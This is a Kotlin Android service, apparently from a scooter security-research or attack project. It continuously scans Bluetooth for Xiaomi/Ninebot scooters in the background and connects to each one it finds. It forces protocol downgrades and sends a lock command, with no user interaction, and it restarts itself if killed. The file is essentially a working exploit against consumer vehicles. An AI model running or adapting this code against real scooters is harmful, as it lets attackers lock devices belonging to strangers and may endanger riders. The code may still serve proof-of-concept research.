package u.scooters.attack.main

import android.annotation.SuppressLint
import android.app.Activity.DEFAULT_KEYS_SEARCH_GLOBAL
import android.app.Service
import android.bluetooth.BluetoothManager
import android.bluetooth.le.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.util.Log
import android.widget.Toast

import androidx.annotation.RequiresApi
import com.polidea.rxandroidble2.RxBleClient
import com.polidea.rxandroidble2.RxBleConnection
import com.polidea.rxandroidble2.RxBleDevice
import com.polidea.rxandroidble2.RxBleDeviceServices
import io.reactivex.Observable
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.disposables.Disposable
import u.scooters.attack.main.Requests.ScooterNameRequest
import u.scooters.attack.main.Requests.SwitchRequests.Locking.LockOff
import u.scooters.attack.main.Requests.SwitchRequests.Locking.LockOn
import u.scooters.attack.main.Requests.downgradeTo5AA5Request
import u.scooters.attack.main.Requests.downgradeToClearRequest
import u.scooters.attack.util.Commands
import u.scooters.attack.util.HexString
import u.scooters.attack.util.LegacyPacketBuilder
import u.scooters.attack.util.NinebotProtocolEncryption
import java.util.*
import kotlin.collections.ArrayList


class BackgroundAttack : Service() {

    private var connectionObservable: Observable<RxBleConnection>? = null
    private var connectionDisposable: Disposable? = null
    private var bleDevice: RxBleDevice? = null
    private var rxBleClient: RxBleClient? = null
    private var connection: RxBleConnection? = null
    private var protocol: String? = null
    private var securityLevel: Int? = null
    private var name: String? = null

    private var handler: Handler? = null
    private var handler1: Handler? = null



    private val isConnected: Boolean
        get() = bleDevice!!.connectionState == RxBleConnection.RxBleConnectionState.CONNECTED


    private val bluetoothLeScanner: BluetoothLeScanner
        get() {
            val bluetoothManager = applicationContext.getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager
            val bluetoothAdapter = bluetoothManager.adapter
            return bluetoothAdapter.bluetoothLeScanner
        }
    var settings: ScanSettings = ScanSettings.Builder()
        .setScanMode(ScanSettings.SCAN_MODE_LOW_LATENCY).build()
    var filters: MutableList<ScanFilter> = ArrayList<ScanFilter>()

    @SuppressLint("CheckResult")
    private fun setupNotificationAndSend() {
        connection!!.setupNotification(UUID.fromString(Constants.RX))
            .doOnNext { notificationObservable: Observable<ByteArray?>? -> }
            .flatMap { notificationObservable: Observable<ByteArray>? -> notificationObservable } // <-- Notification has been set up, now observe value changes.
            .onErrorResumeNext(Observable.empty())
            .subscribe { bytes: ByteArray -> Log.d("BackgroundAttack",bytes.toString()) }
    }


    private val process: Runnable = object : Runnable {
        override fun run() {

            setupNotificationAndSend()
            try {
                if (isConnected) {
                    if (protocol != null) {
                        Log.d("BackgroundAttack", "Protocol: " + protocol)

                        println("Connection established!")

                        if (protocol == DeviceActivity.XIAOMI_XORED_55AB) {
                            Commands.READ = 0x61
                            sendPackets(downgradeToClearRequest())
                        } else if (protocol == DeviceActivity.NINEBOT_ENCRYPTED_5AA5) {
                            LegacyPacketBuilder.ninebot = true
                        } else if (protocol == DeviceActivity.XIAOMI_ENCRYPTED_55AB) {
                            LegacyPacketBuilder.ninebot = true
                            sendPackets(ScooterNameRequest())
                            sendPackets(downgradeTo5AA5Request())
                        }

                        sendPackets(LockOn())
                    }
                }

            }catch (e: NoSuchElementException) {}
        }


    }


    @RequiresApi(Build.VERSION_CODES.S)
    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
        onTaskRemoved(intent)
        filters.add( ScanFilter.Builder().setManufacturerData(0x424e, byteArrayOf()).build())

        Log.e("BackgroundAttack","onStartCommand")
        bluetoothLeScanner.startScan(filters,settings,bleScanner)
        return START_STICKY
    }

    override fun onBind(intent: Intent): IBinder {
        TODO("Return the communication channel to the service.")
    }

    override fun onTaskRemoved(rootIntent: Intent) {
        val restartServiceIntent = Intent(applicationContext, this.javaClass)
        restartServiceIntent.setPackage(packageName)
        startService(restartServiceIntent)
        super.onTaskRemoved(rootIntent)
    }


    private val bleScanner = object :ScanCallback() {
        override fun onScanResult(callbackType: Int, result: ScanResult?) {
            super.onScanResult(callbackType, result)
            Log.d("DeviceListActivity","onScanResult: ${result?.device?.address} - ${result?.device?.name}")

            rxBleClient = RxBleClient.create(this@BackgroundAttack)
            bleDevice = rxBleClient!!.getBleDevice(result?.device?.address!!)

            connectionObservable = bleDevice!!.establishConnection(false)

            securityLevel = result.scanRecord?.manufacturerSpecificData!!.valueAt(0)[1].toInt()

            if (!isConnected) {
                doConnect()
                val handler = Handler()
                handler.postDelayed({
                    handler!!.post(process)
                }, 500)
            } else {
                handler!!.post(process)
            }
        }

        override fun onBatchScanResults(results: MutableList<ScanResult>?) {
            super.onBatchScanResults(results)
            Log.d("DeviceListActivity","onBatchScanResults:${results.toString()}")
        }

        override fun onScanFailed(errorCode: Int) {
            super.onScanFailed(errorCode)
            Log.d("DeviceListActivity", "onScanFailed: $errorCode")
        }

    }


    private fun doConnect() {

        this.connectionDisposable =
            this.bleDevice!!.establishConnection(false)
                .observeOn(AndroidSchedulers.mainThread())
                .doFinally { this.connectionDisposable = null }
                .doOnError { throwable: Throwable? ->
                    println("ERROR,disconnect")
                    this.connectionDisposable = null
                    bluetoothLeScanner.startScan(filters,settings,bleScanner)
                }
                .subscribe({ connection: RxBleConnection -> onConnectionReceived(connection) }) { throwable: Throwable ->
                    println("ERROR on subscribing")
                    bluetoothLeScanner.startScan(filters,settings,bleScanner)
                }



    }


    @OptIn(ExperimentalUnsignedTypes::class)
    @SuppressLint("CheckResult")
    private fun onConnectionReceived(connection: RxBleConnection) {

        //bleDevice!!.establishConnection(false)
        //bleDevice!!.connectionState == RxBleConnection.RxBleConnectionState.CONNECTED

        Log.e("BackgroundAttack","ConnectionReceived")
        Log.d("BackgroundAttack","Security Level: "+ securityLevel)
        if(securityLevel == 0){
            this.protocol = DeviceActivity.XIAOMI_LEGACY_55AA
        }else if(securityLevel == 1){
            this.protocol = DeviceActivity.XIAOMI_XORED_55AB
        }else if(securityLevel == 2){

            connection.discoverServices().subscribe( {services: RxBleDeviceServices -> findSecureProtocol(services)} )

            this.name = bleDevice?.name
            LegacyPacketBuilder.encryptionNinebot = NinebotProtocolEncryption(this.name.toString())
            Thread.sleep(1000)
        }

        this.connection = connection
        Log.d("BackgroundAttack","Protocol: "+ this.protocol)




    }

    @SuppressLint("CheckResult")
    private fun findSecureProtocol(services: RxBleDeviceServices){
        if(services.bluetoothGattServices.get(3).characteristics[2].uuid.toString().equals(Constants.AVDTP))
            this.protocol = DeviceActivity.XIAOMI_ENCRYPTED_55AB
        else
            this.protocol = DeviceActivity.NINEBOT_ENCRYPTED_5AA5
        return
    }

    private fun sendPackets(toSend : IRequest){
        try {
            val command = toSend!!.requestString
            Log.d("BackgroundAttack","command:"+command);

                this.connection!!.writeCharacteristic(
                    UUID.fromString(Constants.TX),
                    HexString.hexToBytes(command)
                ).subscribe()
                Log.d("BackgroundAttack", "Req sent: " + command);

        } catch (e: NoSuchElementException) {
            Log.e("BackgroundAttack","Error on sending message")
        }

    }


}